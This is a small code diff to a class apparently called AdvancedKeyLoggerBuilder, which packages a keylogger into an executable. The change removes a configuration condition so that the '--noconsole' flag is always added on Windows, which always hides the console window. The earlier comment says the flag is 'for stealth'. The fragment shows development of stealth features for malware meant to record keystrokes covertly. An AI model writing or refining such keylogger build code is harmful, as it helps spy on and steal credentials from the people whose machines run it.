@@ -173,8 +173,8 @@ class AdvancedKeyLoggerBuilder:
             '--clean',
         ]
 
-        # Add noconsole on Windows for stealth
-        if sys.platform == 'win32' and config.get('self_protection', False):
+        # Add noconsole on Windows to hide console window
+        if sys.platform == 'win32':
             cmd.append('--noconsole')
 
         # Add modules as hidden imports
